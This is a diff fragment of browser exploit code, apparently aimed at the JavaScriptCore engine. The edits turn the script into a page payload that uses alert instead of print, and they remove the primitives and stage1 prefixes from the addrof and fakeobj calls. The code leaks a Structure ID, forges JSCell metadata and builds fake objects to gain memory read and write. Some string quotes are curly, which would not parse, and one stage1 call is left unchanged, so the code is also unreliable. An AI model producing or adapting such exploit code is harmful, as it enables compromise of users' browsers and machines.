@@ -182,15 +182,15 @@ function leakStructureId(victimObj) {
         description: victimObj
     };
 
-    var containerAddr = primitives.addrof(container);
+    var containerAddr = addrof(container);
     var fakeSymbolAddr = Add(containerAddr, 0x10);
     var fakeStringAddr = Add(fakeSymbolAddr, 0x10);
 
-    var fakeString = primitives.fakeobj(fakeStringAddr.asDouble());
+    var fakeString = fakeobj(fakeStringAddr.asDouble());
 
     container.m_uid = fakeString;
 
-    var fakeSymbol = primitives.fakeobj(fakeSymbolAddr.asDouble());
+    var fakeSymbol = fakeobj(fakeSymbolAddr.asDouble());
 
     var structureId = "";
     var symbolDescription = Symbol.prototype.toString.call(fakeSymbol);
@@ -212,12 +212,12 @@ function sprayStructures() {
 }
 */
 function pwn() {
-    print(“starting”);
+    alert(“starting”);
    // sprayStructures();
 
     var targetArray = new Array();
     var structureid = leakStructureId(targetArray);
-    print(structureid);
+    alert(structureid);
 // post spectre & gigacage compatible
     // however, memory rw is backed by normal js objects and not typed
     // arrays, and is less reliable
@@ -286,7 +286,7 @@ function pwn() {
         return victim.p0
     }
 
-    i32[0] = structureid               // Structure ID
+    i32[0] = 0x200               // Structure ID
     i32[1] = 0x01082007 - 0x10000 // Fake JSCell metadata, adjusted for boxing
     var outer = {
         p0: 0, // Padding, so that the rest of inline properties are 16-byte aligned
@@ -302,16 +302,16 @@ function pwn() {
     var fake_addr = stage1.addrof(outer) + FPO + 0x8
     //print('fake obj @ ' + hex(fake_addr))
 
-    var unboxed_addr = stage1.addrof(unboxed)
-    var boxed_addr = stage1.addrof(boxed)
-    var victim_addr = stage1.addrof(victim)
+    var unboxed_addr = addrof(unboxed)
+    var boxed_addr = addrof(boxed)
+    var victim_addr = addrof(victim)
     print('leak ' + hex(leak_addr)
         + '\nunboxed ' + hex(unboxed_addr)
         + '\nboxed ' + hex(boxed_addr)
         + '\nvictim ' + hex(victim_addr))
 
     var holder = {fake: {}}
-    holder.fake = stage1.fakeobj(fake_addr)
+    holder.fake = fakeobj(fake_addr)
 
     // From here on GC would be uncool
 
@@ -388,8 +388,9 @@ function pwn() {
             throw 'maybe later'
         },
     }
-print(“done”)
+alert(“done”)
 
   }
+alert(“...”)
 pwn();
 </script>
